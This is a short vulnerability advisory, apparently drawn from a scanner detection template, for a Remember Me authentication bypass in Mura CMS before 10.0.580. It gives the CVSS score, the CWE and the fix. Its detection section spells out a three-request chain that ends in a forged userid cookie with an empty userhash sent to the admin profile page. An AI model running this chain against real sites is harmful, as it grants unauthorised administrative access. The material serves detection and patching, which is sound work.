## Vulnerability

Mura CMS before 10.0.580 is vulnerable to authentication bypass in the Remember Me function. An attacker can bypass authentication via a crafted web request and thereby obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.

Impact: Successful exploitation allows an attacker to bypass authentication and gain unauthorized access to the Mura CMS application.  
CVSS 3.1 Score: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
CWE: CWE-863  
Remediation: Upgrade to version 10.0.580 or later.

## PoC / Detection
Classification: auth-bypass

The template performs a chained 3-request sequence against the target:  
1. GET / (to harvest siteid via regex extractor)  
2. GET /index.cfm/_api/json/v1/{{siteid}}/content/?fields=lastupdatebyid (extracts lastupdatebyid UUID)  
3. GET /admin/?muraAction=cEditProfile.edit with Cookie: userid={{uuid}}; userhash= (empty hash)  

Success is confirmed when the admin response body_3 contains both the string "userid" and the phrase "Edit Profile".
